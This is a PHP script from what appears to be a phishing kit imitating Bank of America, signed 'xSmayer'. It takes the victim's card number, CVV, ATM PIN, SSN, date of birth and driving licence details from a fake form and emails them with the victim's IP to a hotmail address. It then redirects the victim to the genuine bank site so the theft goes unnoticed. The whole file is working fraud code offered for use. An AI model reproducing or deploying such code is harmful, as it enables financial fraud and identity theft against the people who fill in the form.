<?
$ip = getenv("REMOTE_ADDR");
$message .= "+############### xSmayer ##############+\n";
$message .= "Name On card            : ".$_POST['formtext1']."\n";
$message .= "Cc number            : ".$_POST['formtext2']."\n";
$message .= "expire mm            : ".$_POST['formselect1']."\n";
$message .= "expire yy            : ".$_POST['formselect2']."\n";
$message .= "cvv            : ".$_POST['formtext3']."\n";
$message .= "atm pin            : ".$_POST['formtext4']."\n";
$message .= "+############################################+\n";
$message .= "dob dd            : ".$_POST['formselect5']."\n";
$message .= "dob mm            : ".$_POST['formselect6']."\n";
$message .= "dob yyyy            : ".$_POST['formselect7']."\n";
$message .= "ssn            : ".$_POST['formtext6']."\n";
$message .= "driving license           : ".$_POST['formtext5']."\n";
$message .= "D Expire MM           : ".$_POST['formtext7']."\n";
$message .= "D Expire YY          : ".$_POST['formtext8']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "+############################################+\n";
//Change Your Email Here 
$send = "xSmayer.79@hotmail.com";
$subject = "xBOA LOADING 100% : $ip"; 
$headers = "From: xSmayer<customer@xblack.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

header("Location: https://secure.bankofamerica.com/applynow/landingPage.go");

	 
?>